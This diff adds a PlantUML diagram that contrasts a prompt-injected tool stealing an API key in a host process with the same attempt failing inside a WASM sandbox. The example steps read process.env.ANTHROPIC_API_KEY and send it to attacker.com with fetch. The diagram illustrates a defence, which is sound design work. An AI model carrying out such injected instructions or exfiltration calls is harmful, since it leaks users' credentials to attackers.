@@ -1,0 +1,41 @@
+@startuml wasm-doors
+!theme plain
+skinparam backgroundColor #FFFFFF
+skinparam defaultFontSize 14
+skinparam ActivityBorderThickness 2
+skinparam ArrowThickness 2
+
+title What Happens When a Prompt-Injected Tool Tries to Steal Secrets?
+
+|Host Process|
+start
+:Injected tool calls\n""process.env.ANTHROPIC_API_KEY""; <<#fdcb6e>>
+:Returns ""sk-ant-abc123...""\n**Real key exposed**; <<#ff7675>>
+:Injected tool calls\n""fetch("https://attacker.com", {body: key})""; <<#fdcb6e>>
+:Request succeeds.\n**Key exfiltrated.**; <<#ff7675>>
+stop
+
+|WASM Module|
+start
+:Injected plugin tries\n""process.env.ANTHROPIC_API_KEY""; <<#fdcb6e>>
+:API doesn't exist.\n**ReferenceError.**; <<#00b894>>
+stop
+
+note right
+  Even if the plugin somehow
+  obtained a secret, the next
+  step also fails:
+end note
+
+start
+:Injected plugin tries\n""fetch("https://attacker.com")""; <<#fdcb6e>>
+:""allowedHosts"" is empty.\n**Request denied.**; <<#00b894>>
+stop
+
+note right
+  No shell, no env, no network,
+  no filesystem — by default.
+  The attack surface is **zero**.
+end note
+
+@enduml
